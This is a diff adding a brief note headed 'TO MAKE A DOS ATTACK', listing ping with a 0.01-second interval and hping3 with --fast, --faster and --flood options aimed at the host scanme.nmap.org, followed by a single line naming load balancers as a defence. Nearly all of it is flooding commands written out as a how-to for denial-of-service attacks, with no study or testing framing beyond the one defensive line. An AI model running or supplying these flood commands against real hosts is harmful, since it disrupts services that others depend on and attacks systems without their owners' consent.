@@ -1,0 +1,9 @@
+TO MAKE A DOS ATTACK:
+=====================
+1) PING => ping scanme.nmap.org -i 0.01 --> sends 100 req per sec
+2) hping3 => use :
+		# hping3 scanme.nmap.org --fast 
+		# hping3 scanme.nmap.org --faster
+		# hping3 scanme.nmap.org --flood 
+
+TO PREVENT DOS ATTACKS FACILITIES USED LOADBALANCER
